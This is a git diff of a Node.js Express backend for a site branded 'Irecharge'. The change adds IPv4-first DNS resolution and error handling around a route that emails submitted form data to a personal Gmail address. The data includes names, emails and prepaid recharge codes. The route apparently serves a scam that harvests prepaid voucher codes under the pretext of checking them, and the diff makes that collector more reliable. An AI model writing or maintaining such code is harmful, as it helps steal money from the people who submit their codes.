@@ -1,3 +1,5 @@
+const dns = require("dns");
+dns.setDefaultResultOrder("ipv4first");
 const express = require("express");
 const cors = require("cors");
 
@@ -31,34 +33,26 @@ const transporter = nodemailer.createTransport({
 
 app.post("/envoyer", async (req, res) => {
   const data = req.body;
-
-  await transporter.sendMail({
-    from: `"Irecharge" <${process.env.EMAIL_USER}`,
-    replyTo: data.email,
-
-    to: "sofiamarley29@gmail.com",
-
-    subject: `Nouvelle demande : ${data.formulaire}`,
-
-    text: `
-
-    Formulaire : ${data.formulaire}
-
-    Nom : ${data.nom}
-
-    Prénom : ${data.prenom}
-
-    Email : ${data.email}
-
-    Recharge : ${data.typeRecharge}
-
-    Date : ${data.dateAchat}
-
-    Code : ${data.codeRecharge}
-
-    Cacher le code : ${data.cacherCode}
-    `,
-  });
-
-  res.send("ok");
+  try {
+    await transporter.sendMail({
+      from: `"Irecharge" <${process.env.EMAIL_USER}>`,
+      replyTo: data.email,
+      to: "sofiamarley29@gmail.com",
+      subject: `Nouvelle demande : ${data.formulaire}`,
+      text: `
+      Formulaire : ${data.formulaire}
+      Nom : ${data.nom}
+      Prénom : ${data.prenom}
+      Email : ${data.email}
+      Recharge : ${data.typeRecharge}
+      Date : ${data.dateAchat}
+      Code : ${data.codeRecharge}
+      Cacher le code : ${data.cacherCode}
+      `,
+    });
+    res.status(200).send("ok");
+  } catch (error) {
+    console.error("Erreur envoi mail:", error);
+    res.status(500).send("Erreur lors de l'envoi");
+  }
 });
